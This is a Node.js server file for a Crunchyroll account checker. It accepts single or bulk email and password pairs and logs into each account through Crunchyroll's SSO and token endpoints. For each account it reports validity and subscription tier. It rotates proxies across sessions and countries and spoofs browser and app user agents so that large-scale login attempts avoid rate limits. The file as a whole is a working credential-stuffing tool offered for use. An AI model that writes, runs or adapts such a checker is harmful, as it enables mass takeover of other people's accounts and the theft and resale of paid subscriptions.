require("dotenv").config();
const express = require("express");
const https = require("https");
const http = require("http");
const { randomUUID } = require("crypto");

const app = express();
app.use(express.json());

const PORT = parseInt(process.env.PORT) || 3000;
const SERVICE_KEY = process.env.CR_SERVICE_KEY || "";
const CONCURRENCY = Math.min(parseInt(process.env.CONCURRENCY) || 5, 20);

// ── Crunchyroll constants ────────────────────────────────────────────────────
const SSO_HOST = "sso.crunchyroll.com";
const CR_HOST = "www.crunchyroll.com";
const CR_CLIENT_ID = "kmj7imhjt_q90lcbzzsj";
const ANDROID_UA = "Crunchyroll/3.46.2 Android/14 okhttp/4.12.0";
const BROWSER_UA =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 " +
  "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

// ── Proxy rotation pool ───────────────────────────────────────────────────────
const PROXY_COUNTRIES = (process.env.PROXY_COUNTRIES || "us,gb,ca,au,de,fr,jp,sg,nl,br,mx,kr,it,es")
  .split(",")
  .map((c) => c.trim().toLowerCase())
  .filter(Boolean);

let _countryIdx = 0;

/**
 * Build a proxy URL for a single account check.
 *
 * Strategy:
 *   - If PROXY_URL contains `{session}` placeholder  →  replace with a fresh UUID
 *     so every account gets a sticky IP from the provider.
 *   - If PROXY_URL contains `_country-` suffix  →  rotate through PROXY_COUNTRIES
 *     so accounts spread across many geo IPs.
 *   - Otherwise use PROXY_URL as-is.
 *
 * Examples of supported PROXY_URL formats:
 *   http://USER:PASS_country-us@host:1111          ← country rotation
 *   http://USER:PASS_session-{session}@host:1111   ← session rotation
 *   http://USER:PASS_session-{session}_country-us@host:1111  ← both
 *   http://USER:PASS@host:1111                     ← plain (no rotation)
 */
function buildRotatingProxyUrl() {
  const base = process.env.PROXY_URL || "";
  if (!base) return null;

  const sessionId = randomUUID().replace(/-/g, "").slice(0, 12);
  const cc = PROXY_COUNTRIES[_countryIdx % PROXY_COUNTRIES.length];
  _countryIdx++;

  return base
    .replace("{session}", sessionId)
    .replace(/_country-[a-z]{2}/i, `_country-${cc}`);
}

function parseProxy(proxyUrl) {
  const u = new URL(proxyUrl);
  return {
    host: u.hostname,
    port: parseInt(u.port) || 1111,
    auth: Buffer.from(`${decodeURIComponent(u.username)}:${decodeURIComponent(u.password)}`).toString("base64"),
  };
}

// ── HTTP/HTTPS via proxy (CONNECT tunnel) ─────────────────────────────────────
function proxyRequest(proxyUrl, { hostname, path, method, headers = {}, body } = {}) {
  return new Promise((resolve, reject) => {
    const { host, port, auth } = parseProxy(proxyUrl);
    const bodyBuf = body ? Buffer.from(body, "utf8") : null;

    const connectReq = http.request({
      host,
      port,
      method: "CONNECT",
      path: `${hostname}:443`,
      headers: {
        Host: `${hostname}:443`,
        "Proxy-Authorization": `Basic ${auth}`,
      },
    });

    connectReq.setTimeout(25000, () => {
      connectReq.destroy();
      reject(new Error("Proxy CONNECT timeout"));
    });

    connectReq.on("connect", (_, socket) => {
      const reqHeaders = { ...headers };
      if (bodyBuf) reqHeaders["Content-Length"] = String(bodyBuf.length);

      const req = https.request({
        host: hostname,
        path,
        method,
        headers: reqHeaders,
        socket,
        agent: false,
      });

      req.setTimeout(20000, () => {
        req.destroy();
        reject(new Error("Request timeout after proxy CONNECT"));
      });

      let rawBody = "";
      req.on("response", (res) => {
        res.setEncoding("utf8");
        res.on("data", (chunk) => (rawBody += chunk));
        res.on("end", () =>
          resolve({ status: res.statusCode, headers: res.headers, body: rawBody })
        );
      });

      req.on("error", reject);
      if (bodyBuf) req.write(bodyBuf);
      req.end();
    });

    connectReq.on("error", reject);
    connectReq.end();
  });
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function decodeJwt(token) {
  try {
    const payload = token.split(".")[1];
    return JSON.parse(Buffer.from(payload, "base64url").toString("utf8"));
  } catch {
    return {};
  }
}

function extractEtpRt(setCookieHeaders) {
  for (const raw of setCookieHeaders || []) {
    const m = raw.match(/etp_rt=([^;]+)/);
    if (m) return m[1];
  }
  return null;
}

// ── Core CR login + subscription check ───────────────────────────────────────
async function checkAccount(email, password, proxyUrl) {
  const t0 = Date.now();
  const px = proxyUrl || buildRotatingProxyUrl();

  if (!px) {
    throw new Error(
      "No proxy configured. Set PROXY_URL in .env or pass proxyUrl in the request body."
    );
  }

  // 1. SSO login ──────────────────────────────────────────────────────────────
  const loginRes = await proxyRequest(px, {
    hostname: SSO_HOST,
    path: "/api/login",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": BROWSER_UA,
      Accept: "application/json, text/plain, */*",
      Origin: "https://sso.crunchyroll.com",
      Referer: "https://sso.crunchyroll.com/login",
    },
    body: JSON.stringify({ email, password, eventSettings: {} }),
  });

  if (loginRes.status === 401) {
    return { status: "invalid", email, tier: null, durationMs: Date.now() - t0 };
  }

  if (loginRes.status !== 200) {
    return { status: "error", email, error: `SSO HTTP ${loginRes.status}`, durationMs: Date.now() - t0 };
  }

  let loginData = {};
  try { loginData = JSON.parse(loginRes.body); } catch {}

  if (loginData.status === "error") {
    const e = loginData.error || "";
    if (e === "invalid_credentials") {
      return { status: "invalid", email, tier: null, durationMs: Date.now() - t0 };
    }
    return { status: "error", email, error: e, durationMs: Date.now() - t0 };
  }

  const etpRt = extractEtpRt(loginRes.headers["set-cookie"]);
  if (!etpRt) {
    return { status: "error", email, error: "etp_rt cookie missing", durationMs: Date.now() - t0 };
  }

  // 2. Exchange etp_rt → Bearer token ─────────────────────────────────────────
  const tokenRes = await proxyRequest(px, {
    hostname: CR_HOST,
    path: "/auth/v1/token",
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      Authorization: "Basic " + Buffer.from(`${CR_CLIENT_ID}:`).toString("base64"),
      "User-Agent": ANDROID_UA,
      Accept: "application/json",
      "ETP-Anonymous-Id": randomUUID(),
      Cookie: `etp_rt=${etpRt}`,
    },
    body: "grant_type=etp_rt_cookie&scope=offline_access",
  });

  if (tokenRes.status !== 200) {
    return { status: "error", email, error: `Token exchange HTTP ${tokenRes.status}`, durationMs: Date.now() - t0 };
  }

  let tokenData = {};
  try { tokenData = JSON.parse(tokenRes.body); } catch {}

  const accessToken = tokenData.access_token;
  if (!accessToken) {
    return { status: "error", email, error: "No access_token in response", durationMs: Date.now() - t0 };
  }

  // 3. Decode account ID from JWT ───────────────────────────────────────────────
  const jwt = decodeJwt(accessToken);
  const accountId = jwt.etp_user_id || jwt.sub;
  if (!accountId) {
    return { status: "error", email, error: "Could not extract account ID from JWT", durationMs: Date.now() - t0 };
  }

  // 4. Fetch subscription tier ──────────────────────────────────────────────────
  const subsRes = await proxyRequest(px, {
    hostname: CR_HOST,
    path: `/subs/v4/accounts/${accountId}/subscriptions`,
    method: "GET",
    headers: {
      Authorization: `Bearer ${accessToken}`,
      "User-Agent": ANDROID_UA,
      Accept: "application/json",
    },
  });

  let subsData = {};
  try { subsData = JSON.parse(subsRes.body); } catch {}

  let tier = "free";
  const ct = (subsData.containerType || "").toLowerCase();
  if (ct === "mega_fan") tier = "mega_fan";
  else if (ct === "fan") tier = "fan";
  else if (ct === "free") tier = "free";
  else {
    // Fallback: scan raw items array for tier strings
    const flat = JSON.stringify(subsData.subscriptions || subsData.items || []);
    if (flat.includes("cr_mega_fan")) tier = "mega_fan";
    else if (flat.includes("cr_fan")) tier = "fan";
  }

  return {
    status: "valid",
    email,
    tier,
    containerType: subsData.containerType || null,
    durationMs: Date.now() - t0,
  };
}

// ── In-memory log ring buffer ────────────────────────────────────────────────
const LOGS = [];
const LOG_MAX = 500;
function log(entry) {
  LOGS.push({ ts: Date.now(), ...entry });
  if (LOGS.length > LOG_MAX) LOGS.shift();
}

// ── Concurrency limiter (simple semaphore) ────────────────────────────────────
function makeSemaphore(limit) {
  let active = 0;
  const queue = [];
  const next = () => {
    if (queue.length === 0 || active >= limit) return;
    active++;
    const { fn, resolve, reject } = queue.shift();
    Promise.resolve().then(fn).then(
      (v) => { active--; resolve(v); next(); },
      (e) => { active--; reject(e); next(); }
    );
  };
  return (fn) => new Promise((resolve, reject) => {
    queue.push({ fn, resolve, reject });
    next();
  });
}
const semaphore = makeSemaphore(CONCURRENCY);

// ── Auth middleware ───────────────────────────────────────────────────────────
function auth(req, res, next) {
  if (!SERVICE_KEY) return next();
  const key = req.headers["x-service-key"] || (req.headers["authorization"] || "").replace("Bearer ", "");
  if (key !== SERVICE_KEY) return res.status(401).json({ error: "Unauthorized" });
  next();
}

// ── Routes ────────────────────────────────────────────────────────────────────

// Health check — no auth required
app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    service: "crunchyroll-login",
    version: "1.0.0",
    proxyConfigured: !!process.env.PROXY_URL,
    concurrency: CONCURRENCY,
  });
});

// Recent logs
app.get("/logs", auth, (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 100, LOG_MAX);
  res.json(LOGS.slice(-limit).reverse());
});

/**
 * POST /check
 * Check a single account.
 *
 * Body: { email, password, proxyUrl? }
 * - proxyUrl is optional. If omitted, PROXY_URL env var is used with rotation.
 *
 * Response: { status, email, tier, containerType, durationMs }
 *   status: "valid" | "invalid" | "error"
 *   tier:   "mega_fan" | "fan" | "free" | null
 */
app.post("/check", auth, async (req, res) => {
  const { email, password, proxyUrl } = req.body || {};
  if (!email || !password) {
    return res.status(400).json({ error: "email and password are required" });
  }
  try {
    const result = await semaphore(() => checkAccount(email, password, proxyUrl || null));
    log({ email, status: result.status, tier: result.tier, ms: result.durationMs });
    res.json(result);
  } catch (err) {
    log({ email, status: "error", error: err.message });
    res.status(500).json({ status: "error", email, error: err.message });
  }
});

/**
 * POST /check-bulk
 * Check many accounts with streaming NDJSON response.
 *
 * Body: {
 *   accounts: [ { email, password, proxyUrl? }, ... ],
 *   concurrency?: number   (1-20, default: env CONCURRENCY or 5)
 * }
 *
 * Each line of the response is a JSON result object.
 * A progress line looks like: { __progress: true, completed, total }
 */
app.post("/check-bulk", auth, async (req, res) => {
  const { accounts, concurrency: rawConc } = req.body || {};
  if (!Array.isArray(accounts) || accounts.length === 0) {
    return res.status(400).json({ error: "accounts array required" });
  }

  const concurrency = Math.min(parseInt(rawConc) || CONCURRENCY, 20);
  const sem = makeSemaphore(concurrency);
  const total = accounts.length;
  let completed = 0;

  res.setHeader("Content-Type", "application/x-ndjson");
  res.setHeader("Transfer-Encoding", "chunked");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("X-Accel-Buffering", "no");

  const sendProgress = () => {
    res.write(JSON.stringify({ __progress: true, completed, total }) + "\n");
  };

  sendProgress();

  await Promise.all(
    accounts.map(({ email, password, proxyUrl }) =>
      sem(async () => {
        try {
          const result = await checkAccount(email, password, proxyUrl || null);
          log({ email, status: result.status, tier: result.tier, ms: result.durationMs });
          res.write(JSON.stringify(result) + "\n");
        } catch (err) {
          const errResult = { status: "error", email, error: err.message };
          log({ email, status: "error", error: err.message });
          res.write(JSON.stringify(errResult) + "\n");
        } finally {
          completed++;
          sendProgress();
        }
      })
    )
  );

  res.end();
});

// ── Start ─────────────────────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`[CR Login] Listening on :${PORT}`);
  console.log(`[CR Login] Concurrency : ${CONCURRENCY}`);
  console.log(`[CR Login] Proxy       : ${process.env.PROXY_URL ? "configured (rotation ON)" : "none set"}`);
  if (SERVICE_KEY) console.log("[CR Login] Auth        : enabled (CR_SERVICE_KEY)");
});
